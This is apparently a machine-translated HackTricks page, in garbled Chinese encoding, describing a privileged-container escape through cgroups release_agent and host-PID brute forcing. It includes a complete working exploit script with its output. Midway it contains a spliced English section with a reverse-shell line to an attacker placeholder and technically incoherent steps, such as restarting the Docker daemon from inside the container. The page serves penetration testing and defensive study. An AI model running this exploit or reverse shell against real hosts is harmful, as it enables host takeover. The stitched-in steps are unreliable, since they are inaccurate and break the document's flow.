<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>


# ä»‹ç»

åœ¨å®¹å™¨é…ç½®äº†ä¸€ä¸ªå­˜å‚¨é©±åŠ¨ç¨‹åºï¼Œè¯¥é©±åŠ¨ç¨‹åºå…¬å¼€äº†**æŒ‚è½½ç‚¹çš„å®Œæ•´ä¸»æœºè·¯å¾„**ï¼ˆä¾‹å¦‚`overlayfs`ï¼‰æ—¶ï¼Œä¹‹å‰çš„PoCéƒ½èƒ½æ­£å¸¸å·¥ä½œï¼Œä½†æ˜¯æœ‰ä¸€äº›é…ç½®**å¹¶æ²¡æœ‰æ˜æ˜¾åœ°å…¬å¼€ä¸»æœºæ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½ç‚¹**ã€‚

åœ¨è¿™ä¸ªPoCä¸­ï¼Œæˆ‘ä»¬å°†ä¸ä½¿ç”¨å®¹å™¨åœ¨ä¸»æœºæ–‡ä»¶ç³»ç»Ÿä¸­çš„ä½ç½®è·¯å¾„ï¼Œè€Œæ˜¯åœ¨ä¸»æœºä¸­å‘ç°ä¸€ä¸ªå®¹å™¨PIDã€‚

## ä¸å…¬å¼€ä¸»æœºå†…è·¯å¾„ä½ç½®çš„å®¹å™¨ç¤ºä¾‹

### Kata Containers
```
root@container:~$ head -1 /etc/mtab
kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
```
[Kata Containers](https://katacontainers.io) é»˜è®¤æƒ…å†µä¸‹é€šè¿‡ `9pfs` æŒ‚è½½å®¹å™¨çš„æ ¹æ–‡ä»¶ç³»ç»Ÿã€‚è¿™ä¸ä¼šæ³„éœ²æœ‰å…³ Kata Containers è™šæ‹Ÿæœºä¸­å®¹å™¨æ–‡ä»¶ç³»ç»Ÿä½ç½®çš„ä»»ä½•ä¿¡æ¯ã€‚

### è®¾å¤‡æ˜ å°„å™¨
```
root@container:~$ head -1 /etc/mtab
/dev/sdc / ext4 rw,relatime,stripe=384 0 0
```
æˆ‘åœ¨ä¸€ä¸ªå®æ—¶ç¯å¢ƒä¸­çœ‹åˆ°äº†ä¸€ä¸ªå…·æœ‰è¿™ä¸ªæ ¹æŒ‚è½½çš„å®¹å™¨ï¼Œæˆ‘ç›¸ä¿¡è¯¥å®¹å™¨æ˜¯ä½¿ç”¨ç‰¹å®šçš„`devicemapper`å­˜å‚¨é©±åŠ¨ç¨‹åºé…ç½®è¿è¡Œçš„ï¼Œä½†æ˜¯åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘æ— æ³•åœ¨æµ‹è¯•ç¯å¢ƒä¸­å¤åˆ¶è¿™ç§è¡Œä¸ºã€‚

# PoC

æ‰€éœ€çš„ä¸€ä¸ªå…³é”®ä¿¡æ¯æ˜¯**ç›¸å¯¹äºå®¹å™¨ä¸»æœºçš„å®Œæ•´è·¯å¾„ï¼Œç”¨äºåœ¨å®¹å™¨å†…æ‰§è¡Œçš„æ–‡ä»¶**ã€‚å¦‚æœæ— æ³•ä»å®¹å™¨å†…çš„æŒ‚è½½ç‚¹ä¸­åˆ†è¾¨å‡ºè¿™ä¸ªè·¯å¾„ï¼Œæˆ‘ä»¬å¿…é¡»åœ¨å…¶ä»–åœ°æ–¹å¯»æ‰¾ã€‚

## /proc/\<pid>/root

Linuxçš„`/proc`ä¼ªæ–‡ä»¶ç³»ç»Ÿå…¬å¼€äº†ç³»ç»Ÿä¸Šè¿è¡Œçš„æ‰€æœ‰è¿›ç¨‹çš„å†…æ ¸è¿›ç¨‹æ•°æ®ç»“æ„ï¼ŒåŒ…æ‹¬åœ¨ä¸åŒå‘½åç©ºé—´ä¸­è¿è¡Œçš„è¿›ç¨‹ï¼Œä¾‹å¦‚å®¹å™¨å†…éƒ¨çš„è¿›ç¨‹ã€‚å¯ä»¥é€šè¿‡åœ¨å®¹å™¨ä¸­è¿è¡Œå‘½ä»¤å¹¶è®¿é—®ä¸»æœºä¸Šçš„è¿›ç¨‹çš„`/proc`ç›®å½•æ¥å±•ç¤ºè¿™ä¸€ç‚¹ï¼š
```bash
root@container:~$ sleep 100
```

```bash
root@host:~$ ps -eaf | grep sleep
root     28936 28909  0 10:11 pts/0    00:00:00 sleep 100
root@host:~$ ls -la /proc/`pidof sleep`
total 0
dr-xr-xr-x   9 root root 0 Nov 19 10:03 .
dr-xr-xr-x 430 root root 0 Nov  9 15:41 ..
dr-xr-xr-x   2 root root 0 Nov 19 10:04 attr
-rw-r--r--   1 root root 0 Nov 19 10:04 autogroup
-r--------   1 root root 0 Nov 19 10:04 auxv
-r--r--r--   1 root root 0 Nov 19 10:03 cgroup
--w-------   1 root root 0 Nov 19 10:04 clear_refs
-r--r--r--   1 root root 0 Nov 19 10:04 cmdline
...
-rw-r--r--   1 root root 0 Nov 19 10:29 projid_map
lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
-rw-r--r--   1 root root 0 Nov 19 10:29 sched
...
```
_é¡ºä¾¿è¯´ä¸€ä¸‹ï¼Œ`/proc/<pid>/root` æ•°æ®ç»“æ„æ›¾ç»è®©æˆ‘å›°æƒ‘äº†å¾ˆé•¿æ—¶é—´ï¼Œæˆ‘ä¸€ç›´æ— æ³•ç†è§£ä¸ºä»€ä¹ˆå°†ç¬¦å·é“¾æ¥æŒ‡å‘ `/` æ˜¯æœ‰ç”¨çš„ï¼Œç›´åˆ°æˆ‘åœ¨ man æ‰‹å†Œä¸­è¯»åˆ°äº†å®é™…çš„å®šä¹‰ï¼š_

> /proc/\[pid]/root
>
> UNIX å’Œ Linux æ”¯æŒæ¯ä¸ªè¿›ç¨‹çš„æ–‡ä»¶ç³»ç»Ÿæ ¹ç›®å½•çš„æ¦‚å¿µï¼Œé€šè¿‡ chroot(2) ç³»ç»Ÿè°ƒç”¨è®¾ç½®ã€‚è¯¥æ–‡ä»¶æ˜¯ä¸€ä¸ªç¬¦å·é“¾æ¥ï¼ŒæŒ‡å‘è¿›ç¨‹çš„æ ¹ç›®å½•ï¼Œå¹¶ä¸”ä¸ exe å’Œ fd/\* çš„è¡Œä¸ºç›¸åŒã€‚
>
> ä½†è¯·æ³¨æ„ï¼Œè¯¥æ–‡ä»¶ä¸ä»…ä»…æ˜¯ä¸€ä¸ªç¬¦å·é“¾æ¥ã€‚å®ƒæä¾›äº†ä¸è¿›ç¨‹æœ¬èº«ç›¸åŒçš„æ–‡ä»¶ç³»ç»Ÿè§†å›¾ï¼ˆåŒ…æ‹¬å‘½åç©ºé—´å’Œæ¯ä¸ªè¿›ç¨‹æŒ‚è½½çš„é›†åˆï¼‰ã€‚

**`/proc/<pid>/root` ç¬¦å·é“¾æ¥å¯ä»¥ç”¨ä½œå®¹å™¨å†…ä»»ä½•æ–‡ä»¶çš„ä¸»æœºç›¸å¯¹è·¯å¾„**ï¼š
```bash
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```

```bash
root@host:~$ cat /proc/`pidof sleep`/root/findme
findme
```
{% hint style="warning" %}
**è¿™å°†æ”»å‡»çš„è¦æ±‚ä»éœ€è¦çŸ¥é“å®¹å™¨å†…æ–‡ä»¶ç›¸å¯¹äºå®¹å™¨ä¸»æœºçš„å®Œæ•´è·¯å¾„ï¼Œå˜ä¸ºéœ€è¦çŸ¥é“å®¹å™¨ä¸­ä»»æ„è¿›ç¨‹çš„pidã€‚**
{% endhint %}

## Pid Bashing <a href="#pid-bashing" id="pid-bashing"></a>

è¿™å®é™…ä¸Šæ˜¯æ¯”è¾ƒå®¹æ˜“çš„éƒ¨åˆ†ï¼ŒLinuxä¸­çš„è¿›ç¨‹IDæ˜¯æ•°å­—ä¸”æŒ‰é¡ºåºåˆ†é…çš„ã€‚`init`è¿›ç¨‹è¢«åˆ†é…è¿›ç¨‹ID `1`ï¼Œéšåçš„è¿›ç¨‹è¢«åˆ†é…é€’å¢çš„IDã€‚ä¸ºäº†ç¡®å®šå®¹å™¨å†…è¿›ç¨‹çš„**ä¸»æœºè¿›ç¨‹IDï¼Œå¯ä»¥ä½¿ç”¨æš´åŠ›é€’å¢æœç´¢**ï¼š
```
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```
# Docker Breakout Privilege Escalation: Release Agent Exploit (Relative Paths to PIDs)

## Introduction

In certain scenarios, it is possible to exploit the release agent feature in Docker to escalate privileges and gain root access on the host system. This technique involves manipulating relative paths to process IDs (PIDs) within the Docker container.

## Exploitation Steps

1. Start by creating a new Docker container with the `--privileged` flag to gain access to the host's devices:

   ```bash
   docker run -it --privileged <image>
   ```

2. Inside the container, create a new directory and navigate to it:

   ```bash
   mkdir /host_root
   cd /host_root
   ```

3. Create a new shell script named `release_agent.sh` with the following contents:

   ```bash
   #!/bin/sh
   echo "#!/bin/sh" > /host_root/release_agent.sh
   echo "bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1" >> /host_root/release_agent.sh
   ```

   Replace `<attacker_ip>` and `<attacker_port>` with the IP address and port of your attacker machine.

4. Make the script executable:

   ```bash
   chmod +x /host_root/release_agent.sh
   ```

5. Set the `release-agent` configuration option to the path of the script:

   ```bash
   echo "/host_root/release_agent.sh" > /host_root/release-agent
   ```

6. Restart the Docker daemon:

   ```bash
   systemctl restart docker
   ```

7. Wait for the Docker daemon to restart and execute the release agent script:

   ```bash
   cat /proc/self/exe > /dev/null
   ```

8. At this point, the release agent script will be executed with root privileges on the host system. You should now have a reverse shell connection to your attacker machine.

## Mitigation

To prevent this privilege escalation technique, follow these recommendations:

- Avoid running containers with the `--privileged` flag unless absolutely necessary.
- Regularly update Docker to ensure you have the latest security patches.
- Implement strict access controls and limit the capabilities of containers.
- Monitor and review the release agent configuration to detect any unauthorized changes.

Remember that security is a continuous process, and it is important to stay updated with the latest security best practices.
```bash
root@host:~$ COUNTER=1
root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
root@host:~$ echo ${COUNTER}
7822
root@host:~$ cat /proc/${COUNTER}/root/findme
findme
```
## å°†æ‰€æœ‰å†…å®¹æ•´åˆåœ¨ä¸€èµ· <a href="#putting-it-all-together" id="putting-it-all-together"></a>

ä¸ºäº†å®Œæˆè¿™æ¬¡æ”»å‡»ï¼Œå¯ä»¥ä½¿ç”¨æš´åŠ›ç ´è§£æŠ€æœ¯æ¥**çŒœæµ‹è·¯å¾„`/proc/<pid>/root/payload.sh`çš„PID**ï¼Œæ¯æ¬¡è¿­ä»£å°†çŒœæµ‹çš„pidè·¯å¾„**å†™å…¥cgroupsçš„`release_agent`æ–‡ä»¶ï¼Œè§¦å‘`release_agent`ï¼Œå¹¶æŸ¥çœ‹æ˜¯å¦åˆ›å»ºäº†è¾“å‡ºæ–‡ä»¶ã€‚

è¿™ç§æŠ€æœ¯çš„å”¯ä¸€æ³¨æ„äº‹é¡¹æ˜¯å®ƒç»å¯¹ä¸æ˜¯ä¸€ä¸ªéšè”½çš„æ–¹æ³•ï¼Œå¯èƒ½ä¼šå¯¼è‡´pidè®¡æ•°éå¸¸é«˜ã€‚ç”±äºæ²¡æœ‰é•¿æ—¶é—´è¿è¡Œçš„è¿›ç¨‹ï¼Œè¿™**åº”è¯¥**ä¸ä¼šå¯¼è‡´å¯é æ€§é—®é¢˜ï¼Œä½†è¯·ä¸è¦å¼•ç”¨æˆ‘ã€‚

ä¸‹é¢çš„PoCå®ç°äº†è¿™äº›æŠ€æœ¯ï¼Œæä¾›äº†ä¸€ä¸ªæ¯”FelixåŸå§‹PoCä¸­ä½¿ç”¨cgroupsçš„`release_agent`åŠŸèƒ½é€ƒé€¸ç‰¹æƒå®¹å™¨æ›´é€šç”¨çš„æ”»å‡»æ–¹æ³•ï¼š
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
åœ¨å…·æœ‰ç‰¹æƒçš„å®¹å™¨ä¸­æ‰§è¡ŒPoCåº”è¯¥ä¼šæä¾›ç±»ä¼¼ä»¥ä¸‹çš„è¾“å‡ºï¼š
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
# å‚è€ƒèµ„æ–™

* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricksä»“åº“](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloudä»“åº“](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
